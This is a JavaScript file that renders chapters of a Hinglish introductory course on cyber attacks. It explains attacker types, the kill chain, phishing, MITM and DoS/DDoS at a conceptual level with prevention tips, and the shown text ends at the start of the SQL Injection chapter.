
/* ═══════════════════════════════════════════════════
   CYBER ATTACKS FUNDAMENTALS - chapters2.js
   Course 2: AlexCyberX
═══════════════════════════════════════════════════ */

const cyberAttackChapters = [
  { title: "Cyber Attacks Introduction",            prev: null,                             next: "Social Engineering & Phishing"     },
  { title: "Social Engineering & Phishing",         prev: "Cyber Attacks Introduction",     next: "MITM Attack"                      },
  { title: "MITM Attack",                           prev: "Social Engineering & Phishing",  next: "DoS & DDoS Attacks"               },
  { title: "DoS & DDoS Attacks",                    prev: "MITM Attack",                    next: "SQL Injection"                    },
  { title: "SQL Injection",                         prev: "DoS & DDoS Attacks",             next: "XSS Attack"                      },
  { title: "XSS Attack",                            prev: "SQL Injection",                  next: "DNS Spoofing & Poisoning"         },
  { title: "DNS Spoofing & Poisoning",              prev: "XSS Attack",                     next: "Ransomware & Malware"             },
  { title: "Ransomware & Malware",                  prev: "DNS Spoofing & Poisoning",       next: "TLS & Encryption Attacks"         },
  { title: "TLS & Encryption Attacks",              prev: "Ransomware & Malware",           next: "Brute Force & Password Attacks"   },
  { title: "Brute Force & Password Attacks",        prev: "TLS & Encryption Attacks",       next: "Attack Defense & Prevention"     },
  { title: "Attack Defense & Prevention",           prev: "Brute Force & Password Attacks", next: null                               },
];

let currentCyberChapter = 0;

function loadCyberChapter(index) {
  currentCyberChapter = index;

  const chapterInfo = cyberAttackChapters[index];
  if (chapterInfo) {
    document.title = chapterInfo.title + ', AlexCyberX Cyber Attacks Course';
  }

  document.querySelectorAll('.cyber-chapter-item').forEach((el, i) => {
    el.classList.toggle('active', i === index);
  });

  const ch = cyberAttackChapters[index];
  const prevBtn = document.getElementById('cyberPrevBtn');
  const nextBtn = document.getElementById('cyberNextBtn');

  if (ch && ch.prev) {
    prevBtn.style.visibility = 'visible';
    document.getElementById('cyberPrevTitle').textContent = ch.prev;
    prevBtn.onclick = () => loadCyberChapter(index - 1);
  } else {
    prevBtn.style.visibility = 'hidden';
  }

  if (ch && ch.next) {
    nextBtn.style.visibility = 'visible';
    document.getElementById('cyberNextTitle').textContent = ch.next;
    nextBtn.onclick = () => loadCyberChapter(index + 1);
  } else {
    nextBtn.style.visibility = 'hidden';
  }

  // ── Content ──────────────────────────────────────
  if (index === 0) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. Cyber Attack Kya Hota Hai?</h2>
      <p>Cyber Attack matlab hai kisi unauthorized person dwara computer systems, networks, ya data ko damage, disrupt, ya access karne ki koshish. Ye attacks automated tools se ho sakte hain ya manually ek skilled attacker dwara kiye ja sakte hain.</p>
      <div class="info-box"><p><strong>Simple Definition:</strong> Jaise ek chor lock tod ke ghar mein ghusta hai, waise hi cyber attacker system ki vulnerabilities use karke unauthorized access leta hai.</p></div>

      <h2>2. Attacker Kaun Hote Hain?</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Script Kiddie','Tools use karta hai, khud nahi banata. Low skill.','rgba(255,255,255,0.06)'],
          ['Hacktivist','Political/social cause ke liye attack karta hai.','rgba(255,255,255,0.06)'],
          ['Cybercriminal','Paise ke liye attack karta hai. Ransomware, fraud.','rgba(220,20,20,0.12)'],
          ['Nation-State','Government sponsored. Highly sophisticated attacks.','rgba(220,20,20,0.18)'],
          ['Insider Threat','Company ka apna employee jo harm karta hai.','rgba(220,20,20,0.12)'],
          ['APT Group','Advanced Persistent Threat. Long-term infiltration.','rgba(220,20,20,0.18)'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid ${r[2]};padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>3. Attack Motivations</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Financial Gain','Ransomware, bank fraud, credit card theft, crypto theft'],
          ['Espionage','Competitor ya government ke secrets churana'],
          ['Disruption','Service down karna, chaos create karna'],
          ['Revenge','Ex-employee ya competitor se badla'],
          ['Ideological','Political beliefs ya hacktivism'],
          ['Challenge','Thrill of hacking, skills prove karna'],
        ].map(r=>`
        <div style="display:grid;grid-template-columns:160px 1fr;gap:8px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;align-items:center;">
          <span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</span>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${r[1]}</span>
        </div>`).join('')}
      </div>

      <h2>4. Attack Categories</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['PASSIVE','Sirf observe karte hain, eavesdropping, traffic capture. Target ko pata nahi chalta.','rgba(255,200,0,0.15)','rgba(255,200,0,0.3)','#ffc800'],
          ['ACTIVE','System ko modify ya disrupt karte hain, DoS, MITM, injection. Traceable hote hain.','rgba(220,20,20,0.15)','rgba(220,20,20,0.3)','#dc1414'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid ${r[2]};padding:14px 18px;">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
            <span style="background:${r[1]};border:1px solid ${r[2]};border-radius:6px;padding:2px 10px;font-size:10px;font-weight:700;color:${r[4]};letter-spacing:2px;font-family:'Rajdhani',sans-serif;">${r[0]}</span>
          </div>
          <div style="font-family:'Inter',sans-serif;font-size:13px;color:#aaa;">${r[3]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Cyber Kill Chain</h2>
      <p>Cyber Kill Chain ek framework hai jo batata hai ki attacker step by step kaise attack karta hai. Ye Lockheed Martin ne develop kiya tha.</p>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['1. Reconnaissance','Target ke baare mein information gather karna'],
          ['2. Weaponization','Exploit + payload milana'],
          ['3. Delivery','Phishing, USB, exploit se deliver karna'],
          ['4. Exploitation','Vulnerability trigger karna'],
          ['5. Installation','Malware install karna'],
          ['6. C2','Command & Control channel establish karna'],
          ['7. Actions','Data theft, disruption, ransom'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===0||i===6?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:280px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:${i===0||i===6?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>6. Common Attack Types: Overview</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Social Engineering','Psychological manipulation, phishing, pretexting, baiting'],
          ['MITM Attack','Traffic intercept karna, credentials, session tokens churana'],
          ['DoS / DDoS','Service crash karna, bandwidth ya resource exhaustion'],
          ['SQL Injection','Database mein malicious queries inject karna'],
          ['XSS','Web pages mein malicious scripts inject karna'],
          ['DNS Spoofing','DNS cache corrupt karke fake sites par redirect karna'],
          ['Ransomware','Files encrypt karke ransom maangna'],
          ['Brute Force','Password guess karna, millions of attempts'],
        ].map((r,i)=>`
        <div style="display:flex;align-items:center;gap:14px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <span style="background:rgba(220,20,20,0.12);border:1px solid rgba(220,20,20,0.25);border-radius:50%;width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#dc1414;font-family:'Rajdhani',sans-serif;flex-shrink:0;">${i+1}</span>
          <div><div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;">${r[0]}</div><div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;margin-top:2px;">${r[1]}</div></div>
        </div>`).join('')}
      </div>

      <h2>7. CIA Triad: Security Foundation</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['C','Confidentiality','Sirf authorized log data access kar saken'],
          ['I','Integrity','Data modify nahi hona chahiye unauthorized tarike se'],
          ['A','Availability','Authorized users ko data available rehna chahiye'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:14px;border:1px solid rgba(220,20,20,0.2);padding:18px 14px;text-align:center;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:36px;font-weight:700;color:#dc1414;line-height:1;">${r[0]}</div>
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin:8px 0 6px;">${r[1]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;">${r[2]}</div>
        </div>`).join('')}
      </div>

      <div class="info-box">
        <p>Har cyber attack in teeno mein se kisi ek ko target karta hai. Ransomware Availability attack hai. Data theft Confidentiality attack hai. File tampering Integrity attack hai. Is framework se attack ka impact samjha jaata hai.</p>
      </div>

    `;
  }

  else if (index === 1) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. Social Engineering Kya Hai?</h2>
      <p>Social Engineering matlab hai log ko psychologically manipulate karna taaki woh sensitive information de ya kuch aisa kare jo attacker chahta hai. Technology exploit karne ke bajaye human psychology exploit karta hai.</p>
      <div class="info-box"><p><strong>Key Insight:</strong> Sabse strong firewall bhi kaam nahi karta agar koi employee phone par password bata de. Social engineering isi liye dangerous hai, technology ko bypass karta hai.</p></div>

      <h2>2. Social Engineering Types</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Phishing','Fake emails jo legitimate lagte hain, target credentials steal karna'],
          ['Spear Phishing','Specific person ko target karna with personalized content'],
          ['Vishing','Voice call par manipulate karna, fake bank calls'],
          ['Smishing','SMS se attack, fake delivery links, OTP theft'],
          ['Pretexting','Fake scenario create karna, fake IT support'],
          ['Baiting','USB drive chhod dena infected malware ke saath'],
          ['Tailgating','Authorized person ke saath restricted area mein ghusna'],
          ['Quid Pro Quo','Kuch dene ka promise karke information lena'],
        ].map((r,i)=>`
        <div style="display:grid;grid-template-columns:160px 1fr;gap:8px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;align-items:center;">
          <span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</span>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${r[1]}</span>
        </div>`).join('')}
      </div>

      <h2>3. Phishing Attack: Deep Dive</h2>
      <p>Phishing sabse common cyber attack hai. 90%+ data breaches phishing se shuru hote hain. Ek convincing email se attacker corporate network tak access pa sakta hai.</p>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['Attacker Email Banata Hai','Legitimate company ka fake email, logo, branding copy'],
          ['Email Mass Send Hoti Hai','Thousands ya millions targets ko'],
          ['User Link Click Karta Hai','Fake login page ya malicious attachment'],
          ['Credentials Enter Hoti Hain','User ko pata nahi, fake site real lagti hai'],
          ['Attacker Ko Data Milta Hai','Real-time ya stored credentials, access milta hai'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===4?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:300px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:${i===4?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>4. Phishing Red Flags: Kaise Pehchane?</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          'Urgent language, "Your account will be closed in 24 hours"',
          'Generic greeting, "Dear Customer" instead of your name',
          'Suspicious sender domain, supprt@amaz0n.com vs amazon.com',
          'Hovering link shows different URL than displayed text',
          'Requesting sensitive info via email',
          'Poor grammar aur spelling mistakes',
          'Unexpected attachment, invoice.pdf.exe',
          'Too good to be true offers',
        ].map(q=>`
        <div style="display:flex;align-items:center;gap:12px;background:rgba(220,20,20,0.07);border:1px solid rgba(220,20,20,0.2);border-radius:8px;padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><path d="M8 2L14 13H2L8 2z" stroke="#dc1414" stroke-width="1.3" stroke-linejoin="round"/><path d="M8 7v3M8 11.5h.01" stroke="#dc1414" stroke-width="1.3" stroke-linecap="round"/></svg>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${q}</span>
        </div>`).join('')}
      </div>

      <h2>5. Spear Phishing vs Generic Phishing</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;padding:8px 16px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);">
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">ASPECT</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">PHISHING</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">SPEAR PHISHING</span>
        </div>
        ${[
          ['Target','Anyone, mass blast','Specific person ya org'],
          ['Research','Koi nahi, generic','Target ka profile study'],
          ['Success Rate','Low (~3%)','High (~30%)'],
          ['Effort','Low','High, personalized'],
          ['Examples','Fake bank emails','CEO ko target karna'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:10px;border:1px solid rgba(255,255,255,0.06);padding:10px 16px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;align-items:center;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#f4f4f5;">${r[2]}</div>
        </div>`).join('')}
      </div>

      <h2>6. Prevention</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Security Awareness Training','Employees ko phishing recognize karna sikhao'],
          ['Email Filtering','Spam aur phishing filters enable karo'],
          ['MFA Enable Karo','Password leak ho bhi to attacker andar nahi a sakta'],
          ['Link Hover Verify','Click karne se pehle URL check karo'],
          ['Official Channel Use Karo','Sensitive actions ke liye hamesha direct site visit karo'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 2) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. MITM Attack Kya Hai?</h2>
      <p>Man-in-the-Middle (MITM) attack mein attacker do parties ke beech mein baith jaata hai, bina unhe pata chale. Victim sochta hai wo directly server se baat kar raha hai, lekin actually attacker beech mein traffic ko intercept kar raha hota hai.</p>
      <div class="info-box"><p><strong>Real-World Example:</strong> Tum coffee shop ke public WiFi se bank login karte ho. Attacker usi network par hai aur tumhara poora traffic, including password, read kar sakta hai.</p></div>

      <h2>2. MITM Attack Interactive Diagram</h2>
      <div style="border:1px solid rgba(220,20,20,0.2);border-radius:14px;overflow:hidden;margin:0 0 28px;background:#0f0f13;">
        <iframe class="acx-diagram-frame" data-diagram="mitm-attack" src="diagrams/mitm-attack.html" scrolling="no" style="width:100%;height:800px;border:none;display:block;overflow:hidden;" loading="lazy" title="MITM Attack Interactive Diagram"></iframe>
      </div>

      <h2>3. MITM Attack Types</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['ARP Spoofing','Local network par fake ARP replies bhejta hai. Gateway ka MAC spoof karta hai. Sabse common MITM technique.'],
          ['DNS Spoofing','DNS responses fake karta hai taaki victim wrong IP par jaaye. Site real lagti hai lekin fake hoti hai.'],
          ['SSL Stripping','HTTPS ko HTTP mein convert karta hai. Victim ko green lock nahi dikhta. Traffic unencrypted ho jaati hai.'],
          ['WiFi Eavesdropping','Public WiFi par unencrypted traffic capture karna. Passive MITM, easy to do.'],
          ['Evil Twin Attack','Fake WiFi hotspot create karna with same SSID. Victim connect ho jaata hai fake network se.'],
          ['BGP Hijacking','Routing protocols manipulate karna. ISP level attack, internet traffic reroute karna.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>4. ARP Spoofing: How It Works</h2>
      <pre><code>Normal Network:
Victim asks: "Who has IP 192.168.1.1 (router)?"
Router replies: "I do! My MAC is AA:BB:CC:DD:EE:FF"
Victim stores this in ARP cache

ARP Spoofing Attack:
Attacker broadcasts: "I have IP 192.168.1.1! My MAC is 11:22:33:44:55:66"
Victim updates ARP cache, router ki jagah attacker ka MAC
Now ALL victim's traffic goes to attacker first

Attacker forwards it to real router (so victim doesn't notice)
But attacker reads everything in between</code></pre>

      <h2>5. SSL Stripping Attack</h2>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['Victim Request','Victim types http://bank.com or clicks link'],
          ['Attacker Intercepts','Attacker sits between victim and server'],
          ['Attacker Upgrades Own Connection','Attacker ↔ Bank is HTTPS (encrypted)'],
          ['Victim Gets HTTP','Victim ↔ Attacker is HTTP (unencrypted)'],
          ['Credentials Exposed','Victim types password, attacker reads plaintext'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===4?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:300px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:${i===4?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>6. MITM mein Kya Churaya Ja Sakta Hai?</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Login Credentials','Username aur passwords'],
          ['Session Tokens','Cookies, without password access'],
          ['Financial Data','Credit card, bank account info'],
          ['Private Messages','Emails, chats, communications'],
          ['API Keys','Developer credentials, full system access'],
          ['Personal Data','PII, identity theft ke liye'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.15);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>7. Prevention</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['HTTPS Hamesha Use Karo','HTTP sites par sensitive info mat dalo'],
          ['Public WiFi Par VPN Use Karo','Encrypted tunnel creates, MITM impossible'],
          ['HSTS Enable Karo','Browser HTTPS enforce karta hai automatically'],
          ['Certificate Pinning','App specific certificate expect karta hai, fake cert fail'],
          ['ARP Monitoring','Network tools ARP poisoning detect kar sakte hain'],
          ['MFA Enable Karo','Credentials steal ho bhi toh account safe rehta hai'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 3) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. DoS Attack Kya Hai?</h2>
      <p>Denial of Service (DoS) attack mein attacker ek system ya service ko itne requests se overwhelm karta hai ki legitimate users use nahi kar pate. Server crash ho jaata hai ya itna slow ho jaata hai ki effectively down hi ho.</p>
      <div class="info-box"><p><strong>Simple Analogy:</strong> Jaise ek restaurant mein ek aadmi har table block kar le aur actually khana order na kare, real customers aa hi nahi sakte. Website ke case mein fake requests real users ke liye service block kar dete hain.</p></div>

      <h2>2. DoS vs DDoS</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;padding:8px 16px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);">
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">ASPECT</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">DoS</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">DDoS</span>
        </div>
        ${[
          ['Source','Single machine','Thousands of machines (botnet)'],
          ['Scale','Limited','Massive, Tbps possible'],
          ['Block Karna','Easy, 1 IP block karo','Difficult, IPs change hoti hain'],
          ['Detection','Easier','Harder, distributed traffic'],
          ['Purpose','Disruption','Major disruption, ransom'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:10px;border:1px solid rgba(255,255,255,0.06);padding:10px 16px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;align-items:center;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#f4f4f5;">${r[2]}</div>
        </div>`).join('')}
      </div>

      <h2>3. DoS / DDoS Interactive Diagram</h2>
      <div style="border:1px solid rgba(220,20,20,0.2);border-radius:14px;overflow:hidden;margin:0 0 28px;background:#080810;">
        <iframe class="acx-diagram-frame" data-diagram="dos-attack" src="diagrams/dos-attack.html" scrolling="no" style="width:100%;height:900px;border:none;display:block;overflow:hidden;" loading="lazy" title="DoS Attack Interactive Diagram"></iframe>
      </div>

      <h2>4. DoS/DDoS Attack Types</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Volume Based','Bandwidth exhaust karna, UDP Flood, ICMP Flood, DNS Amplification'],
          ['Protocol Attacks','Network layer exhaust karna, SYN Flood, Ping of Death, Smurf Attack'],
          ['Application Layer','Specific service crash karna, HTTP Flood, Slowloris'],
          ['Amplification','Small request se bada response generate karna, DNS, NTP amplification'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. SYN Flood: Technical Deep Dive</h2>
      <p>SYN Flood TCP 3-way handshake ka abuse karta hai. Normal mein: Client SYN → Server SYN-ACK → Client ACK. Attack mein: Client SYN → Server SYN-ACK → Client never responds. Server half-open connections ke liye memory allocate karta rehta hai jab tak crash nahi ho jaata.</p>
      <pre><code>Normal 3-Way Handshake:
Client    →    SYN    →    Server
Client    ←   SYN-ACK ←   Server
Client    →    ACK    →    Server
[Connection Established]

SYN Flood:
Attacker  →  SYN (fake IP)  →  Server
Attacker  ←    SYN-ACK      ←  Server
[Attacker never responds, Server waits]
[Thousands of these = Server memory full = CRASH]</code></pre>

      <h2>6. Botnet: DDoS ka Engine</h2>
      <p>DDoS attack ke liye attacker ek botnet use karta hai. Botnet matlab hai thousands of compromised machines (bots) jo attacker ke command par attack karte hain. In machines ke owners ko pata bhi nahi hota.</p>
      <div style="display:flex;flex-direction:column;gap:8px;margin:16px 0 28px;">
        ${[
          ['Infection Phase','Malware se machines compromise hoti hain, email, exploit, USB'],
          ['C2 Registration','Infected machine attacker ke C2 server se connect hoti hai'],
          ['Idle Phase','Bot wait karta hai, normal usage continue rehti hai'],
          ['Attack Command','Attacker C2 se "attack target.com" command deta hai'],
          ['Coordinated Attack','Lakhs machines simultaneously flood karte hain target ko'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===4?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:10px 20px;display:grid;grid-template-columns:180px 1fr;gap:8px;align-items:center;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:${i===4?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>7. Real-World DDoS Scale</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['GitHub 2018','1.35 Tbps, largest at that time. Memcached amplification.','rgba(220,20,20,0.15)'],
          ['Cloudflare 2022','26 million RPS, 5,067 bot IPs across 158 countries.','rgba(220,20,20,0.2)'],
          ['Mirai Botnet 2016','IoT devices use kiya. Dyn DNS down kiya, Netflix, Twitter offline.','rgba(220,20,20,0.12)'],
          ['Google 2023','398 million RPS, HTTP/2 vulnerability use ki.','rgba(220,20,20,0.2)'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid ${r[2]};padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>8. Prevention & Mitigation</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Rate Limiting','Per IP request limit set karo, flood se protect karta hai'],
          ['CDN Use Karo','Cloudflare ya AWS Shield, distributed infrastructure absorbs attack'],
          ['Traffic Scrubbing','Malicious traffic filter karo, clean traffic forward karo'],
          ['BGP Blackholing','Attack traffic ko null route par divert karo'],
          ['Anti-Spoofing Filters','ISP level par fake IPs block karo, SYN flood reduce'],
          ['Anycast Network','Traffic multiple locations par distribute karo'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 4) {
